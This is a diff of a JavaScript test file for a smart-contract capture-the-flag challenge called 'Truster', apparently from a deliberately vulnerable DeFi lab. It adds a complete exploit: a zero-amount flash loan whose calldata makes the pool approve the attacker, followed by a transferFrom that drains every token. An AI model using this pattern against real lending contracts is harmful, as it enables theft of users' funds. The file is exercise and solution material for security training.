@@ -30,13 +30,27 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const amount = await this.token.balanceOf(this.pool.address);
+        await this.pool.flashLoan(
+          0,
+          "0x0000000000000000000000000000000000000001",
+          this.token.address,
+          this.token.contract.methods.approve(attacker, amount.toString()).encodeABI(),
+          { from: attacker }
+        );
+        await this.token.transferFrom(
+          this.pool.address,
+          attacker,
+          amount.toString(),
+          { from: attacker }
+        );
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
         expect(
             await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+        ).to.be.bignumber.equal(TOKENS_IN_POOL);
         expect(
             await this.token.balanceOf(this.pool.address)
         ).to.be.bignumber.equal('0');
